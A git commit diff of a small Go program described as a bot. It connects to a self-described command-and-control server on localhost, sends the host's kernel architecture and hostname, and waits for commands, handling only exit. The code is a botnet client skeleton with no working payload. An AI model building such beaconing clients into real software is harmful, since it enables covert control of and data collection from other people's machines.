9c9c1946ef04a083aa331ede4c15b3adb7d72ff1
TerrificTable <85793326+TerrificTable@users.noreply.github.com>
2022-05-19 21:13:59 +0200

    A Simple Bot written in go

--- bot/src/main.go
+++ bot/src/main.go
@@ -10,36 +10,29 @@ import (
 )
 
 
+
 func main() {
 	Host := "127.0.0.1"
 	Port := 7331
 
-	// Connect to CNC
 	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", Host, Port))
 	if err != nil { fmt.Println(err); time.Sleep(1); main() }
 
-	// Send System Architechture and Hostname to CNC
 	hostStat, _ := host.Info()
-	arch := hostStat.KernelArch
-	conn.Write([]byte(arch))
+	conn.Write([]byte(hostStat.KernelArch))
 	conn.Write([]byte(hostStat.Hostname))
 
-	// Wait for commands
 	for {
-		// Read Command
-		// ===
 		var buffer [1024]byte
 		n, err := conn.Read(buffer[0:])
 		if err != nil { fmt.Println(err) }
 
 		line := strings.TrimSpace(string(buffer[0:n]))
-		// ===
 
-		// Execute Command
 		if line == "exit" || line == "quit" || line == ".q" {
 			fmt.Println("Killed")
+			conn.Close()
 			return
 		}
 	}
-
 }
